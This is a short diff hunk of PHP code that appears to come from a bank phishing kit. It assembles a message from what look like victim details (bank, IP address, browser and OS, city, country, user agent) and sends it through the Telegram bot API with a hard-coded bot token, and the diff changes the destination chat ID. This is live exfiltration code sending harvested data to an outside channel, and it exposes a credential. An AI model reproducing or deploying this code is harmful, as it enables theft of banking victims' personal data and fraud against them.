@@ -176,7 +176,7 @@ if ($success==false) {
 $message ="$bank \n$ip\n$bsr$lh$uos\n$is\n$city$lh$country\n$la$li$lp\n\n$uaget";
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
-    'chat_id' => '-821080105',
+    'chat_id' => '-1001831940786',
     'text' => $message
 ];
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
